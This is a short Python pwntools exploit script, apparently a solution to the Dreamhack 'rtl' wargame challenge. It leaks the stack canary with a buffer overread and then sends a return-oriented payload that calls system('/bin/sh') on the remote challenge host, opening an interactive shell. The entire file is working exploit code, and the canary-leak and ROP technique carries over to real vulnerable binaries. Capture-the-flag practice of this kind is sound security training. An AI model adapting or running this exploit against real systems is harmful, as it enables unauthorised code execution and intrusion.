from pwn import *

context.log_level = 'debug'

# p = process('./rtl')
p = remote("host3.dreamhack.games", 10258)
e = ELF('./rtl')
context.arch = 'amd64'

buf = b"A" * 0x39
p.recvuntil(b"Buf: ")
p.send(buf)
p.recvuntil(buf)
cnry = u64(b"\x00" + p.recv(7))
print(f"cnry: {hex(cnry)}")

ret = 0x0000000000400596 # ROPgadget | grep ": ret". It's necessary because of 16bytes alignment
pop_rdi = 0x0000000000400853 # ROPgadget | grep "pop rdi"
bin_sh = 0x400874 # address of "/bin/sh"
system_plt = e.plt['system'] # address of system@plt


payload = (b"A" * 0x38) + p64(cnry) + (b"B" * 0x8)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system_plt)
p.sendafter(b"Buf: ", payload)

p.interactive()
